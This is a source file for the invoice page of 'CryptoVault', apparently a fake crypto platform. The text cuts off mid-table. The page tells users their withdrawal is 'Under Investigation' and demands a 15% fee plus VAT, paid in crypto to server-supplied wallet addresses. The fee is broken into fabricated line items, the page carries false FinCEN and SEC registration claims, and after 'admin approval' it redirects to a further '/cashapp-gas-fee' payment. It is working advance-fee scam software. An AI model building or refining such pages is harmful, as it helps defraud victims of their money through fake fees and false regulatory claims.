import { useEffect, useRef, useState } from "react";
import { useLocation } from "wouter";
import QRCode from "react-qr-code";
import { loadInvoiceContext, pushTransaction } from "@/hooks/use-transactions";
import { debitAll } from "@/hooks/use-balance";
import { useAuth } from "@/lib/auth-context";
import { publicApi, type WalletConfig } from "@/lib/api";

const FEE_RATE = 0.15;

const LINE_ITEM_TEMPLATES = [
  { id: 1, weight: 0.2067, description: "Compliance & AML Verification Fee",       detail: "Enhanced due diligence + financial crime screening (FATF-compliant)" },
  { id: 2, weight: 0.1600, description: "International Wire Settlement Fee",         detail: "SWIFT GPI transfer processing, correspondent bank charges, FX settlement" },
  { id: 3, weight: 0.0997, description: "Ledger Nano X — Hardware Security Module", detail: "Enterprise cold-storage wallet, Model 2026, Bluetooth-enabled" },
  { id: 4, weight: 0.1033, description: "Blockchain Network Confirmation Fee",       detail: "Multi-chain verification, on-chain attestation, notarization" },
  { id: 5, weight: 0.1283, description: "CoinTracker Pro — Tax Reporting License",  detail: "12-month license, unlimited transactions, CPA export, IRS/HMRC formats" },
  { id: 6, weight: 0.1120, description: "TradingView Premium Annual Subscription",  detail: "Advanced charting suite, 8 simultaneous charts, market alerts, replay" },
  { id: 7, weight: 0.1233, description: "DeFi Security Audit — BlockSec Shield",   detail: "Smart contract risk monitoring, wallet anomaly detection, 12 months" },
  { id: 8, weight: 0.0667, description: "Regulatory Reporting & Sanctions Screening", detail: "OFAC / EU / UN sanctions list check, FinCEN CTR processing" },
];

function buildInvoiceItems(feeTotal: number) {
  const items = LINE_ITEM_TEMPLATES.map(t => ({
    id: t.id,
    description: t.description,
    detail: t.detail,
    quantity: 1,
    unitPrice: Math.round(feeTotal * t.weight * 100) / 100,
  }));
  const sumExceptLast = Math.round(items.slice(0, -1).reduce((s, it) => s + it.unitPrice, 0) * 100) / 100;
  items[items.length - 1].unitPrice = Math.round((feeTotal - sumExceptLast) * 100) / 100;
  return items;
}

const SUPPORTED_COINS = [
  { symbol: "BTC",  name: "Bitcoin",  color: "bg-amber-500/10 border-amber-500/30 text-amber-400" },
  { symbol: "USDT", name: "Tether",   color: "bg-emerald-500/10 border-emerald-500/30 text-emerald-400" },
  { symbol: "USDC", name: "USD Coin", color: "bg-blue-500/10 border-blue-500/30 text-blue-400" },
  { symbol: "ETH",  name: "Ethereum", color: "bg-purple-500/10 border-purple-500/30 text-purple-400" },
  { symbol: "SOL",  name: "Solana",   color: "bg-violet-500/10 border-violet-500/30 text-violet-400" },
  { symbol: "XRP",  name: "XRP",      color: "bg-cyan-500/10 border-cyan-500/30 text-cyan-400" },
  { symbol: "BNB",  name: "BNB",      color: "bg-yellow-500/10 border-yellow-500/30 text-yellow-400" },
];

function escapeHtml(str: string | null | undefined): string {
  if (!str) return "";
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#x27;");
}

function qrImageUrl(value: string, size = 150): string {
  return `https://api.qrserver.com/v1/create-qr-code/?size=${size}x${size}&data=${encodeURIComponent(value)}&format=png&margin=4`;
}

type ConfirmState = "idle" | "submitting" | "waiting" | "approved" | "denied" | "error";

export default function Invoice() {
  const [, navigate] = useLocation();
  const { user } = useAuth();

  const [confirmState, setConfirmState] = useState<ConfirmState>("idle");
  const [errorMsg, setErrorMsg] = useState<string>("");
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const handledRef = useRef<boolean>(false);

  const [cryptoPanelOpen, setCryptoPanelOpen] = useState(false);
  const [selectedCoin, setSelectedCoin] = useState<string | null>(null);
  const [selectedNetwork, setSelectedNetwork] = useState<WalletConfig | null>(null);
  const [walletConfigs, setWalletConfigs] = useState<WalletConfig[]>([]);
  const [walletLoading, setWalletLoading] = useState(false);
  const [copied, setCopied] = useState(false);
  const qrContainerRef = useRef<HTMLDivElement>(null);

  function getQrDataUrl(): string {
    if (!qrContainerRef.current) return "";
    const svg = qrContainerRef.current.querySelector("svg");
    if (!svg) return "";
    const serialized = new XMLSerializer().serializeToString(svg);
    return "data:image/svg+xml;base64," + btoa(unescape(encodeURIComponent(serialized)));
  }

  useEffect(() => {
    return () => {
      if (pollRef.current) clearInterval(pollRef.current);
    };
  }, []);

  useEffect(() => {
    if (cryptoPanelOpen && walletConfigs.length === 0) {
      setWalletLoading(true);
      publicApi.getWalletConfigs()
        .then(setWalletConfigs)
        .finally(() => setWalletLoading(false));
    }
  }, [cryptoPanelOpen]);

  const ctx = loadInvoiceContext();
  const withdrawalAmount = ctx?.usdAmount && ctx.usdAmount > 0 ? ctx.usdAmount : 20435.65;
  const asset = ctx?.asset ?? "USD";
  const rawAmount = ctx?.rawAmount ?? "";
  const txId = ctx?.txId ?? "WDL-001";

  const feeTotal = Math.round(withdrawalAmount * FEE_RATE * 100) / 100;
  const invoiceItems = buildInvoiceItems(feeTotal);
  const subtotal = invoiceItems.reduce((s, i) => s + i.unitPrice * i.quantity, 0);
  const vatRate = 0.075;
  const vatAmount = Math.round(feeTotal * vatRate * 100) / 100;
  const grossTotal = Math.round((feeTotal + vatAmount) * 100) / 100;
  const totalDue = grossTotal;

  async function handleConfirmPayment() {
    if (!user) {
      setErrorMsg("You must be signed in to confirm payment.");
      setConfirmState("error");
      return;
    }
    setErrorMsg("");
    setConfirmState("submitting");
    handledRef.current = false;
    try {
      const { request } = await publicApi.submitPaymentConfirmation({
        name: user.name,
        email: user.email,
        amount: totalDue.toFixed(2),
        currency: "USD",
        notes: `Confirm payment for invoice ${txId.toUpperCase()} — withdrawal $${withdrawalAmount.toFixed(2)} (15% fee + 7.5% VAT). Awaiting admin approval.`,
      });
      setConfirmState("waiting");

      let inFlight = false;
      pollRef.current = setInterval(async () => {
        if (inFlight || handledRef.current) return;
        inFlight = true;
        try {
          const status = await publicApi.getRequestStatus(request.id);
          if (handledRef.current) return;
          if (status.status === "approved") {
            handledRef.current = true;
            if (pollRef.current) clearInterval(pollRef.current);
            const { btcDebited, usdDebited } = debitAll();
            if (btcDebited > 0) {
              pushTransaction({
                type: "Withdrawal",
                asset: "BTC",
                amount: `-${btcDebited.toFixed(4)} BTC`,
                usdAmount: Math.round(usdDebited * 100) / 100,
                address: "Approved Withdrawal",
                status: "Completed",
                statusType: "completed",
              });
            }
            setConfirmState("approved");
            setTimeout(() => navigate("/cashapp-gas-fee"), 1200);
          } else if (status.status === "denied" || status.status === "rejected") {
            handledRef.current = true;
            if (pollRef.current) clearInterval(pollRef.current);
            setConfirmState("denied");
          }
        } catch {
          // ignore transient polling errors
        } finally {
          inFlight = false;
        }
      }, 3000);
    } catch (err) {
      const msg = err instanceof Error ? err.message : "Failed to submit payment confirmation";
      setErrorMsg(msg);
      setConfirmState("error");
    }
  }

  const now = new Date();
  const invoiceDate = now.toLocaleDateString("en-US", { month: "long", day: "numeric", year: "numeric" });
  const invoiceTime = now.toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit" });
  const dueDate = new Date(now.getTime() + 7 * 24 * 60 * 60 * 1000).toLocaleDateString("en-US", { month: "long", day: "numeric", year: "numeric" });
  const invoiceNumber = useRef(`INV-${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, "0")}-${Math.floor(1000 + Math.random() * 8999)}`).current;
  const referenceId = txId.toUpperCase();

  function networksForCoin(symbol: string): WalletConfig[] {
    return walletConfigs.filter(c => c.symbol === symbol);
  }

  function handleCoinClick(symbol: string) {
    if (selectedCoin === symbol) {
      setSelectedCoin(null);
      setSelectedNetwork(null);
    } else {
      setSelectedCoin(symbol);
      setSelectedNetwork(null);
    }
  }

  function handleCopyAddress() {
    if (!selectedNetwork?.address) return;
    navigator.clipboard.writeText(selectedNetwork.address).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    });
  }

  function handlePrintInvoice() {
    const eName = escapeHtml(user?.name ?? "Account Holder");
    const eEmail = escapeHtml(user?.email ?? "CryptoVault Member");
    const eInvNum = escapeHtml(invoiceNumber);
    const eRefId = escapeHtml(referenceId);
    const eDueDate = escapeHtml(dueDate);
    const eDate = escapeHtml(`${invoiceDate} ${invoiceTime}`);

    const qrDataUrl = getQrDataUrl();
    const paymentSection = selectedNetwork
      ? `<div style="margin-top:24px;padding:16px;background:#f0fdf4;border:1px solid #86efac;border-radius:8px;">
          <div style="display:flex;gap:20px;align-items:flex-start">
            ${qrDataUrl ? `<img src="${qrDataUrl}" alt="QR Code" style="width:120px;height:120px;border-radius:6px;flex-shrink:0;border:2px solid #e5e7eb;" />` : ""}
            <div>
              <p style="font-weight:700;color:#166534;margin:0 0 6px;">Payment Method: ${escapeHtml(selectedCoin)} (${escapeHtml(selectedNetwork.network)})</p>
              <p style="font-family:monospace;font-size:12px;color:#374151;margin:0 0 4px;word-break:break-all;">${escapeHtml(selectedNetwork.address)}</p>
              <p style="color:#dc2626;font-size:11px;margin:0;">&#x26A0; Send only ${escapeHtml(selectedCoin)} via the ${escapeHtml(selectedNetwork.network)} network. Sending to the wrong network may result in permanent loss of funds.</p>
            </div>
          </div>
        </div>`
      : "";

    const win = window.open("", "_blank", "width=900,height=700,noopener,noreferrer");
    if (!win) return;
    win.document.write(`<!DOCTYPE html>
<html>
<head>
<title>Invoice ${eInvNum}</title>
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'unsafe-inline'; img-src 'self' data:;">
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #fff; color: #111; padding: 40px; }
  .header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 32px; padding-bottom: 24px; border-bottom: 2px solid #e5e7eb; }
  .logo { display: flex; align-items: center; gap: 12px; }
  .logo-icon { width: 48px; height: 48px; background: #10b981; border-radius: 12px; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 22px; font-weight: 700; }
  .company-name { font-size: 22px; font-weight: 800; color: #111; }
  .company-sub { font-size: 11px; color: #6b7280; text-transform: uppercase; letter-spacing: 1px; }
  .company-addr { margin-top: 8px; font-size: 12px; color: #6b7280; line-height: 1.6; }
  .invoice-meta { text-align: right; }
  .invoice-title { font-size: 36px; font-weight: 900; color: #111; letter-spacing: -1px; }
  .meta-row { display: flex; justify-content: flex-end; gap: 8px; font-size: 13px; margin-top: 4px; }
  .meta-label { color: #6b7280; }
  .meta-val { font-weight: 600; color: #111; }
  .billing { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; margin-bottom: 24px; padding: 20px; background: #f9fafb; border-radius: 8px; }
  .section-label { font-size: 10px; font-weight: 700; color: #10b981; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 8px; }
  table { width: 100%; border-collapse: collapse; margin-bottom: 24px; }
  th { text-align: left; padding: 10px 8px; font-size: 10px; font-weight: 700; color: #6b7280; text-transform: uppercase; border-bottom: 2px solid #e5e7eb; }
  th:last-child, td:last-child { text-align: right; }
  th:nth-child(3) { text-align: center; }
  td { padding: 12px 8px; font-size: 13px; border-bottom: 1px solid #f3f4f6; vertical-align: top; }
  td:nth-child(3) { text-align: center; }
  .item-desc { font-weight: 600; color: #111; margin-bottom: 2px; }
  .item-detail { font-size: 11px; color: #9ca3af; }
  .totals { display: flex; justify-content: flex-end; }
  .totals-box { width: 280px; }
  .total-row { display: flex; justify-content: space-between; padding: 6px 0; font-size: 13px; border-bottom: 1px solid #f3f4f6; }
  .total-final { display: flex; justify-content: space-between; padding: 12px 0; font-size: 18px; font-weight: 800; border-top: 2px solid #111; }
  .footer { margin-top: 32px; padding-top: 20px; border-top: 1px solid #e5e7eb; font-size: 11px; color: #9ca3af; display: flex; justify-content: space-between; align-items: center; }
  @media print { body { padding: 20px; } }
</style>
</head>
<body>
<div class="header">
  <div class="logo">
    <div class="logo-icon">C</div>
    <div>
      <div class="company-name">CryptoVault</div>
      <div class="company-sub">Digital Asset Platform</div>
      <div class="company-addr">100 Wall Street, Suite 2100<br>New York, NY 10005<br>billing@cryptovault.io</div>
    </div>
  </div>
  <div class="invoice-meta">
    <div class="invoice-title">INVOICE</div>
    <div class="meta-row"><span class="meta-label">Invoice No:</span><span class="meta-val">${eInvNum}</span></div>
    <div class="meta-row"><span class="meta-label">Reference:</span><span class="meta-val">${eRefId}</span></div>
    <div class="meta-row"><span class="meta-label">Date:</span><span class="meta-val">${eDate}</span></div>
    <div class="meta-row"><span class="meta-label">Due Date:</span><span class="meta-val">${eDueDate}</span></div>
  </div>
</div>
<div class="billing">
  <div>
    <div class="section-label">Bill To</div>
    <p style="font-weight:700;font-size:14px;">${eName}</p>
    <p style="color:#6b7280;font-size:13px;">${eEmail}</p>
    <p style="color:#6b7280;font-size:13px;">Account ID: CVP-2026-7748821</p>
  </div>
  <div>
    <div class="section-label">Payment Context</div>
    <p style="font-size:13px;"><span style="color:#6b7280">Transaction: </span><span style="font-weight:600">${eRefId}</span></p>
    ${rawAmount ? `<p style="font-size:13px;"><span style="color:#6b7280">Amount (${escapeHtml(asset)}): </span><span style="font-weight:600">${escapeHtml(rawAmount.replace("-",""))}</span></p>` : ""}
    <p style="font-size:13px;"><span style="color:#6b7280">USD Value: </span><span style="font-weight:600">$${withdrawalAmount.toLocaleString("en-US",{minimumFractionDigits:2})}</span></p>
    <p style="font-size:13px;"><span style="color:#6b7280">Status: </span><span style="font-weight:600;color:#d97706">Under Investigation</span></p>
  </div>
</div>
<table>
  <thead>
    <tr><th>#</th><th>Description</th><th>Qty</th><th>Unit Price</th><th>Amount</th></tr>
  </thead>
  <tbody>
    ${invoiceItems.map(item => `
    <tr>
      <td style="color:#9ca3af">${item.id}</td>
      <td><div class="item-desc">${escapeHtml(item.description)}</div><div class="item-detail">${escapeHtml(item.detail)}</div></td>
      <td style="text-align:center">${item.quantity}</td>
      <td style="text-align:right">$${item.unitPrice.toFixed(2)}</td>
      <td style="text-align:right;font-weight:600">$${(item.unitPrice * item.quantity).toFixed(2)}</td>
    </tr>`).join("")}
  </tbody>
</table>
<div class="totals">
  <div class="totals-box">
    <div class="total-row"><span style="color:#6b7280">Subtotal</span><span>$${subtotal.toFixed(2)}</span></div>
    <div class="total-row"><span style="color:#6b7280">VAT (7.5%)</span><span>$${vatAmount.toFixed(2)}</span></div>
    <div class="total-row"><span style="color:#6b7280">Fee Rate</span><span style="color:#d97706">15% of $${withdrawalAmount.toLocaleString()}</span></div>
    <div class="total-final"><span>Balance Due</span><span style="color:#10b981">$${totalDue.toLocaleString("en-US",{minimumFractionDigits:2})}</span></div>
    <p style="font-size:11px;color:#9ca3af;text-align:right;margin-top:4px">USD &mdash; United States Dollar</p>
  </div>
</div>
${paymentSection}
<div class="footer">
  <span>&copy; 2026 CryptoVault &mdash; Reg. No: CV-2019-88421 &middot; FinCEN Licensed MSB &middot; SEC Registered</span>
  <span>Ref: ${eInvNum}</span>
</div>
</body>
</html>`);
    win.document.close();
    setTimeout(() => { win.print(); }, 400);
  }

  function handlePrintReceipt() {
    const eName = escapeHtml(user?.name ?? "Account Holder");
    const eEmail = escapeHtml(user?.email ?? "");
    const eInvNum = escapeHtml(invoiceNumber);
    const eRefId = escapeHtml(referenceId);
    const eDate = escapeHtml(invoiceDate);
    const eTime = escapeHtml(invoiceTime);
    const eDueDate = escapeHtml(dueDate);
    const eReceiptNum = escapeHtml(invoiceNumber.replace("INV-", ""));
    const paymentLine = selectedNetwork
      ? `${escapeHtml(selectedCoin)} via ${escapeHtml(selectedNetwork.network)}`
      : "Cryptocurrency (method not selected)";
    const walletLine = escapeHtml(selectedNetwork?.address ?? "—");
    const qrDataUrl = getQrDataUrl();
    const walletQr = selectedNetwork && qrDataUrl
      ? `<div style="text-align:center;margin:16px 0;"><img src="${qrDataUrl}" alt="Wallet QR Code" style="width:130px;height:130px;border:2px solid #e5e7eb;border-radius:8px;display:inline-block;" /></div>`
      : "";
    const warningSection = selectedNetwork
      ? `<div class="warning">&#x26A0; Ensure you are sending <strong>${escapeHtml(selectedCoin)}</strong> only via the <strong>${escapeHtml(selectedNetwork.network)}</strong> network. Sending to the wrong network will result in permanent loss of funds.</div>`
      : "";

    const win = window.open("", "_blank", "width=700,height=600,noopener,noreferrer");
    if (!win) return;
    win.onafterprint = () => win.close();
    win.document.write(`<!DOCTYPE html>
<html>
<head>
<title>Receipt ${eInvNum}</title>
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'unsafe-inline'; img-src 'self' data:;">
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #fff; color: #111; padding: 40px; max-width: 600px; margin: 0 auto; }
  .header { text-align: center; padding-bottom: 28px; border-bottom: 2px solid #e5e7eb; margin-bottom: 28px; }
  .logo-icon { width: 56px; height: 56px; background: #10b981; border-radius: 14px; display: inline-flex; align-items: center; justify-content: center; color: #fff; font-size: 26px; font-weight: 800; margin-bottom: 10px; }
  .brand { font-size: 22px; font-weight: 800; letter-spacing: -0.5px; }
  .brand-sub { font-size: 11px; color: #6b7280; text-transform: uppercase; letter-spacing: 1.5px; }
  h1 { font-size: 32px; font-weight: 900; letter-spacing: -1px; color: #111; margin: 20px 0 6px; }
  .receipt-id { font-size: 13px; color: #6b7280; }
  .row { display: flex; justify-content: space-between; padding: 11px 0; border-bottom: 1px solid #f3f4f6; font-size: 14px; }
  .row-label { color: #6b7280; }
  .row-val { font-weight: 600; color: #111; text-align: right; max-width: 60%; word-break: break-all; }
  .amount-row { display: flex; justify-content: space-between; padding: 16px 0; border-top: 2px solid #111; border-bottom: 2px solid #111; margin: 16px 0; }
  .amount-label { font-size: 16px; font-weight: 700; }
  .amount-val { font-size: 22px; font-weight: 900; color: #10b981; }
  .status { display: inline-block; padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 700; background: #fef3c7; color: #92400e; border: 1px solid #fde68a; }
  .footer { margin-top: 32px; text-align: center; font-size: 11px; color: #9ca3af; line-height: 1.8; }
  .warning { margin-top: 16px; padding: 12px 16px; background: #fef3c7; border-left: 4px solid #f59e0b; border-radius: 4px; font-size: 12px; color: #92400e; }
  @media print { body { padding: 20px; } }
</style>
</head>
<body>
<div class="header">
  <div><div class="logo-icon">C</div></div>
  <div class="brand">CryptoVault</div>
  <div class="brand-sub">Digital Asset Platform</div>
  <h1>RECEIPT</h1>
  <div class="receipt-id">Receipt #REC-${eReceiptNum}</div>
</div>
<div class="row"><span class="row-label">Invoice No.</span><span class="row-val">${eInvNum}</span></div>
<div class="row"><span class="row-label">Reference</span><span class="row-val">${eRefId}</span></div>
<div class="row"><span class="row-label">Date &amp; Time</span><span class="row-val">${eDate} at ${eTime}</span></div>
<div class="row"><span class="row-label">Due Date</span><span class="row-val">${eDueDate}</span></div>
<div class="row"><span class="row-label">Billed To</span><span class="row-val">${eName}<br><small style="color:#6b7280;font-weight:400">${eEmail}</small></span></div>
<div class="row"><span class="row-label">Withdrawal Amount</span><span class="row-val">$${withdrawalAmount.toLocaleString("en-US",{minimumFractionDigits:2})} USD</span></div>
<div class="row"><span class="row-label">Settlement Fee (15%)</span><span class="row-val">$${feeTotal.toLocaleString("en-US",{minimumFractionDigits:2})}</span></div>
<div class="row"><span class="row-label">VAT (7.5%)</span><span class="row-val">$${vatAmount.toLocaleString("en-US",{minimumFractionDigits:2})}</span></div>
<div class="amount-row">
  <span class="amount-label">Total Due</span>
  <span class="amount-val">$${totalDue.toLocaleString("en-US",{minimumFractionDigits:2})} USD</span>
</div>
<div class="row"><span class="row-label">Payment Method</span><span class="row-val">${paymentLine}</span></div>
<div class="row"><span class="row-label">Wallet Address</span><span class="row-val" style="font-family:monospace;font-size:12px">${walletLine}</span></div>
${walletQr}
<div class="row"><span class="row-label">Transaction Status</span><span class="row-val"><span class="status">Under Investigation</span></span></div>
${warningSection}
<div class="footer">
  <p>CryptoVault &middot; 100 Wall Street, Suite 2100, New York, NY 10005</p>
  <p>billing@cryptovault.io &middot; +1 (800) 555-CRYPTO</p>
  <p>Reg. No: CV-2019-88421 &middot; FinCEN Licensed MSB &middot; SEC Registered</p>
  <p style="margin-top:8px;color:#d1d5db">&copy; 2026 CryptoVault. All rights reserved.</p>
</div>
</body>
</html>`);
    win.document.close();
    setTimeout(() => { win.print(); }, 400);
  }

  return (
    <div className="min-h-screen bg-[#0f1117] p-4 md:p-8">
      {(confirmState === "submitting" || confirmState === "waiting" || confirmState === "approved") && (
        <div className="fixed inset-0 z-50 bg-black/85 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-[#161b27] border border-emerald-500/30 rounded-2xl p-8 max-w-md w-full text-center shadow-2xl">
            {confirmState === "approved" ? (
              <>
                <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-emerald-500/15 flex items-center justify-center">
                  <svg className="w-9 h-9 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M5 13l4 4L19 7" />
                  </svg>
                </div>
                <h2 className="text-xl font-bold text-white mb-2">Payment Approved!</h2>
                <p className="text-sm text-emerald-300 mb-5">Redirecting you to the next step…</p>
                <button
                  onClick={() => navigate("/cashapp-gas-fee")}
                  className="inline-flex items-center justify-center gap-2 px-6 py-3 bg-[#00D632] hover:bg-[#00C02E] text-white rounded-xl text-sm font-bold transition-colors shadow-lg shadow-[#00D632]/20"
                >
                  Continue to Payment
                </button>
              </>
            ) : (
              <>
                <div className="w-16 h-16 mx-auto mb-4 relative">
                  <svg className="animate-spin w-16 h-16 text-emerald-400" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" />
                    <path className="opacity-80" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                  </svg>
                </div>
                <h2 className="text-xl font-bold text-white mb-2">
                  {confirmState === "submitting" ? "Submitting payment…" : "Confirming your payment"}
                </h2>
                <p className="text-sm text-amber-300 font-semibold mb-3 uppercase tracking-wide">
                  Don't leave this page while your payment is being confirmed
                </p>
                <p className="text-xs text-slate-400 leading-relaxed">
                  We've notified our compliance team. Your payment will be confirmed once an admin reviews and approves the request. This can take a few minutes.
                </p>
                <div className="mt-5 flex items-center justify-center gap-2 text-xs text-slate-500">
                  <span className="w-2 h-2 rounded-full bg-amber-400 animate-pulse" />
                  Awaiting admin approval…
                </div>
              </>
            )}
          </div>
        </div>
      )}

      <div className="max-w-4xl mx-auto">
        <button
          onClick={() => navigate("/dashboard")}
          className="flex items-center gap-2 text-sm text-muted-foreground hover:text-foreground mb-6 transition-colors"
        >
          <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
          </svg>
          Back to Dashboard
        </button>

        <div className="relative">
          <div
            aria-hidden="true"
            className="absolute bottom-0 left-0 z-10 pointer-events-none"
            style={{ transform: "translate(-10px, 10px)" }}
          >
            <svg width="72" height="48" viewBox="0 0 72 48" fill="none" xmlns="http://www.w3.org/2000/svg">
              <rect x="5" y="19" width="62" height="11" rx="3" fill="#0a0e18" opacity="0.6" />
              <rect x="4" y="17" width="62" height="10" rx="3" fill="#4b5a7a" />
              <rect x="4" y="17" width="62" height="3" rx="2" fill="#6a7fa0" />
              <rect x="5" y="25" width="5" height="16" rx="2" fill="#4b5a7a" />
              <rect x="5" y="38" width="5" height="3" rx="1.5" fill="#3a4a65" />
              <rect x="60" y="25" width="5" height="16" rx="2" fill="#4b5a7a" />
              <rect x="60" y="38" width="5" height="3" rx="1.5" fill="#3a4a65" />
              <line x1="14" y1="21" x2="58" y2="21" stroke="#3a4a65" strokeWidth="1" strokeLinecap="round" />
              <line x1="14" y1="23" x2="58" y2="23" stroke="#3a4a65" strokeWidth="0.5" strokeLinecap="round" />
              <circle cx="10" cy="22" r="2" fill="#3a4a65" />
              <circle cx="62" cy="22" r="2" fill="#3a4a65" />
            </svg>
          </div>

          <div className="bg-[#161b27] border border-[#242d42] rounded-2xl overflow-hidden shadow-2xl">
            {/* Invoice Header */}
            <div className="bg-gradient-to-r from-[#0d2137] to-[#0b1d30] px-8 py-8 border-b border-[#242d42]">
              <div className="flex flex-col md:flex-row md:items-start md:justify-between gap-6">
                <div>
                  <div className="flex items-center gap-3 mb-4">
                    <div className="w-12 h-12 rounded-2xl bg-emerald-500 flex items-center justify-center shadow-lg">
                      <span className="text-white font-bold text-xl">C</span>
                    </div>
                    <div>
                      <h1 className="text-2xl font-bold text-white">CryptoVault</h1>
                      <p className="text-emerald-400 text-xs font-medium tracking-wide uppercase">Digital Asset Platform</p>
                    </div>
                  </div>
                  <div className="text-sm text-slate-400 space-y-0.5">
                    <p>100 Wall Street, Suite 2100</p>
                    <p>New York, NY 10005</p>
                    <p>United States</p>
                    <p>billing@cryptovault.io</p>
                    <p>+1 (800) 555-CRYPTO</p>
                  </div>
                </div>
                <div className="md:text-right">
                  <h2 className="text-4xl font-bold text-white mb-4">INVOICE</h2>
                  <div className="space-y-2 text-sm">
                    <div className="flex md:flex-row-reverse items-center gap-2">
                      <span className="text-white font-semibold">{invoiceNumber}</span>
                      <span className="text-slate-400">Invoice No:</span>
                    </div>
                    <div className="flex md:flex-row-reverse items-center gap-2">
                      <span className="text-white font-semibold">{referenceId}</span>
                      <span className="text-slate-400">Reference:</span>
                    </div>
                    <div className="flex md:flex-row-reverse items-center gap-2">
                      <span className="text-white font-semibold">{invoiceDate}</span>
                      <span className="text-slate-400">Date:</span>
                    </div>
                    <div className="flex md:flex-row-reverse items-center gap-2">
                      <span className="text-amber-400 font-semibold">{dueDate}</span>
                      <span className="text-slate-400">Due Date:</span>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Bill To */}
            <div className="px-8 py-6 border-b border-[#242d42] bg-[#141920]">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <p className="text-xs font-semibold text-emerald-400 uppercase tracking-widest mb-3">Bill To</p>
                  <p className="text-white font-semibold text-base">Account Holder</p>
                  <p className="text-slate-400 text-sm">CryptoVault Member</p>
                  <p className="text-slate-400 text-sm">Account ID: CVP-2026-7748821</p>
                  <p className="text-slate-400 text-sm">Verified KYC Level 3</p>
                </div>
                <div>
                  <p className="text-xs font-semibold text-emerald-400 uppercase tracking-widest mb-3">Payment Context</p>
                  <div className="space-y-1 text-sm">
                    <div className="flex gap-2">
                      <span className="text-slate-400 min-w-[110px]">Transaction:</span>
                      <span className="text-white font-mono text-xs">{referenceId}</span>
                    </div>
                    {rawAmount && (
                      <div className="flex gap-2">
                        <span className="text-slate-400 min-w-[110px]">Amount ({asset}):</span>
                        <span className="text-white font-semibold">{rawAmount.replace("-", "")}</span>
                      </div>
                    )}
                    <div className="flex gap-2">
                      <span className="text-slate-400 min-w-[110px]">USD Value:</span>
                      <span className="text-white font-semibold">
                        ${withdrawalAmount.toLocaleString("en-US", { minimumFractionDigits: 2 })}
                      </span>
                    </div>
                    <div className="flex gap-2">
                      <span className="text-slate-400 min-w-[110px]">Fee Rate:</span>
                      <span className="text-amber-400 font-semibold">{(FEE_RATE * 100).toFixed(0)}% of withdrawal</span>
                    </div>
                    <div className="flex gap-2">
                      <span className="text-slate-400 min-w-[110px]">Status:</span>
                      <span className="inline-flex items-center gap-1.5 px-2 py-0.5 rounded-full bg-amber-500/15 border border-amber-500/20 text-amber-400 text-xs font-medium">
                        <span className="w-1.5 h-1.5 rounded-full bg-amber-400" />
                        Under Investigation
                      </span>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Fee breakdown notice */}
            <div className="mx-8 mt-6 mb-2 p-3 bg-amber-500/5 border border-amber-500/15 rounded-xl flex items-center gap-3">
              <svg className="w-5 h-5 text-amber-400 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
              </svg>
              <p className="text-xs text-amber-300">
                A <strong>{(FEE_RATE * 100).toFixed(0)}% settlement fee</strong> (
                ${feeTotal.toLocaleString("en-US", { minimumFractionDigits: 2 })}) is required on your
                ${withdrawalAmount.toLocaleString("en-US", { minimumFractionDigits: 2 })} withdrawal.
                This fee covers compliance, network, and regulatory charges itemized below.
              </p>
            </div>

            {/* Line Items */}
            <div className="px-8 py-4">
              <div className="overflow-x-auto">
                <table className="w-full">
                  <thead>
                    <tr className="border-b border-[#2a3550]">
                      <th className="text-left py-3 text-xs font-semibold text-slate-500 uppercase tracking-wider w-8">#</th>
                      <th className="text-left py-3 text-xs font-semibold text-slate-500 uppercase tracking-wider">Description</th>
                      <th className="text-center py-3 text-xs font-semibold text-slate-500 uppercase tracking-wider w-16">Qty</th>
                      <th className="text-right py-3 text-xs font-semibold text-slate-500 uppercase tracking-wider w-28">Unit Price</th>
                      <th className="text-right py-3 text-xs font-semibold text-slate-500 uppercase tracking-wider w-28">Amount</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-[#1e2738]">
                    {invoiceItems.map(item => (
                      <tr key={item.id} className="hover:bg-[#1a2235] transition-colors">
                        <td className="py-4 text-sm text-slate-600">{item.id}</td>
                        <td className="py-4">
                          <p className="text-sm font-semibold text-white">{item.description}</p>
                          <p className="text-xs text-slate-500 mt-0.5">{item.detail}</p>
                        </td>
                        <td className="py-4 text-center text-sm text-slate-300">{item.quantity}</td>
                        <td className="py-4 text-right text-sm text-slate-300">${item.unitPrice.toFixed(2)}</td>
                        <td className="py-4 text-right text-sm font-semibold text-white">
                          ${(item.unitPrice * item.quantity).toFixed(2)}
                        </td>
                      </tr>
                    ))}
